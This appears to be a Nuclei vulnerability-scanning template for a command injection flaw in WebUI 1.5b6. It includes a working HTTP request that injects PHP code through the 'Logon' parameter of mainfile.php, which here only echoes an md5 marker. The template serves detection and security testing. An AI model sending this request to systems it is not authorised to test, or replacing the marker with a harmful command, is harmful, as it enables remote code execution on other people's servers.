# Nuclei Template: WebUI 1.5b6 - Remote Code Execution
**Template ID:** webui-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`webui-rce.yaml`)

## Vulnerability Information & PoC

## Description
WebUI 1.5b6 is vulnerable to remote code execution because the 'mainfile.php' endpoint allows remote attackersto execute arbitrary code via the 'Logon' parameter.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/mainfile.php?username=test&password=testpoc&_login=1&Logon=%27%3Becho%20md5(TestPoc)%3B%27
```

## References
- https://www.exploit-db.com/exploits/36821
